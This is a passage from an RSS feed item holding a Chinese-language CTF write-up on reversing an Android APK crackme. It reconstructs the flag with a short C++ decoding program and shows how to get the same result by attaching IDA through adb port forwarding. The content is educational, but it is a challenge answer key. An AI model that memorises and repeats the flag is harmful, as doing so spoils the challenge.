&lt;p&gt;跟入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__init_my()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/FB093331AD69F8DB4310A023EE8133E0.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;seed&lt;/code&gt;字符串循环减3&lt;/p&gt;

&lt;p&gt;根据这个我们最终还原&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;cstring&amp;gt;
#include &amp;lt;iostream&amp;gt;

using namespace std;

int main()
{
	char temp[17] = &quot;QflMn`fH,ZHVW^7c&quot;;
	for(int i = 0; i &amp;lt; 16; i++)
	{
		if(i &amp;lt; 8)
			temp[i] -= 3;
		printf(&quot;%c&quot;, temp[i] + i);
	}
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Flag是：NdkMobiL4cRackEr&lt;/p&gt;

&lt;p&gt;其实动态调试一下马上就看到结果了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./as
adb forward tcp:23946 tcp:23946
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在这个地方下断点，此时对比的数据就是最终计算出的数据&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/179674EC50AEB8CBC70FCC0EEECC2E45.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;没有反调试什么的，直接IDA attach上去&lt;/p&gt;

&lt;p&gt;有一点要注意的是要输入任意16字节数据，不然第一个长度校验过不了&lt;/p&gt;

&lt;p&gt;跑起来后，输入数据，断在这里数据窗口跟随R0，可以看到我们需要的数据&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E29EED68C17A5867BFA0866FACA2D8FF.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;和阿里某一年的挑战赛试题很像，有兴趣的同学可以找一找&lt;/p&gt;
</description>
                <pubDate>Mon, 13 Mar 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/03/13/2015%E6%B5%B7%E5%B3%A1%E4%B8%A4%E5%B2%B8CTF-%E4%B8%80%E4%B8%AAAPK%E9%80%86%E5%90%91%E8%AF%95%E8%AF%95%E5%90%A7.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/03/13/2015%E6%B5%B7%E5%B3%A1%E4%B8%A4%E5%B2%B8CTF-%E4%B8%80%E4%B8%AAAPK%E9%80%86%E5%90%91%E8%AF%95%E8%AF%95%E5%90%A7.html</guid>
            </item>
        
    </channel>
</rss>
